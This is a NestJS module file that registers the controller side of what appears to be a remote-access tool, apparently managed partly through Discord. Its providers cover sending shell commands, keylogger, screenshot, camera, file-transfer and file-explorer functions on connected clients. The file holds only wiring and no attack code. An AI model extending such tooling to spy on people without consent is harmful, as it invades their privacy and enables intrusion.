import { Module } from "@nestjs/common";

import { SchemasModule } from "@/src/repository/db/schemas.module";

import { ClientModule } from "../client/infrastructure/client.module";
import { SharedModule } from "../shared/shared.module";
import { WsApplicationModule } from "../ws-application/ws-application.module";
import { WsBotModule } from "../ws-bot/ws-bot.module";
import { WsClientModule } from "../ws-client/ws-client.module";
import { ActivateControllerUseCase } from "./application/activate-controller.use-case";
import { AddFriendToControllerUseCase } from "./application/add-friend-to-controller.use-case";
import { FileToClientUseCase } from "./application/events/file-to-client.use-case";
import { GetExplorerClientUseCase } from "./application/events/get-explorer-client.use-case";
import { SendCmdCommandToClientUseCase } from "./application/events/send-cmd-command.use-case";
import { GetCurrentClientUseCase } from "./application/get-current-client.use-case";
import { GetFriendsUseCase } from "./application/get-friends.use-case";
import { ScreensClientUseCase } from "./application/screenshot-client.use-case";
import { SelectCurrentClientUseCase } from "./application/select-current-client.use-case";

import { AuthModule } from "../auth/auth.module";
import { GetTasksUseCase } from "./application/events/get-tasks.use-case";
import { ControllerRoutes } from "./infrastructure/routes/controller-routes.controller";
import { ControllerEvents } from "./infrastructure/routes/controller-events.controller";
import { RedisServiceModule } from "@/src/repository/redis/redis.module";
import { SendKeyloggerToClientUseCase } from "./application/events/send-keylogger.use-case";
import { MessageBotGuard } from "./application/guards/MessageBot.guard";
import { ControllerAuthorizationGuard } from "./application/guards/ControllerAuthorization.guard";
import { DeleteFriendFromControrllerUseCase } from "./application/delete-friend-from-controller.use-case";
import { CamerasUseCase } from "./application/events/cameras.use-case";
import { ControllerDiscordRoutes } from "./infrastructure/routes/controller-discord.controller";
import { PublicModule } from "../public/public.module";

@Module({
  controllers: [ControllerRoutes, ControllerEvents, ControllerDiscordRoutes],
  providers: [
    ActivateControllerUseCase,
    AddFriendToControllerUseCase,
    GetCurrentClientUseCase,
    GetFriendsUseCase,
    FileToClientUseCase,
    SelectCurrentClientUseCase,
    ScreensClientUseCase,
    SendCmdCommandToClientUseCase,
    GetExplorerClientUseCase,
    GetTasksUseCase,
    SendKeyloggerToClientUseCase,
    DeleteFriendFromControrllerUseCase,
    CamerasUseCase,
    MessageBotGuard,
    ControllerAuthorizationGuard
  ],
  imports: [
    SharedModule,
    SchemasModule,
    WsClientModule,
    WsApplicationModule,
    WsBotModule,
    ClientModule,
    AuthModule,
    RedisServiceModule,
    PublicModule
  ],
})
export class ControllerModule { }
